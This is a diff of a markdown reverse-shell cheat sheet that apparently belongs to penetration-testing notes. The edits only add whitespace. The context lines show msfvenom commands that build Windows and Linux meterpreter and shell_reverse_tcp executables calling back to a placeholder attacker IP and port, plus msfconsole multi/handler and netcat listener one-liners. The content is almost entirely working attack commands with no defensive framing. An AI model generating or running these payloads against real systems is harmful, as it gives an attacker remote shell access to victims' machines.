@@ -17,7 +17,8 @@ MSFConsole Listener
 ```bash
 msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
 ```
-**Linux**
+**Linux**  
+
 MSFVenom Payload
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
@@ -28,7 +29,8 @@ msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reve
 ```
 ### Netcat
 
-**Windows**
+**Windows** 
+
 MSFVenom Payload
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > payload.exe
@@ -38,6 +40,7 @@ Netcat Listener
 nc -lvp <Your_Port>
 ```
 **Linux**
+ 
 MSFVenom Payload
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
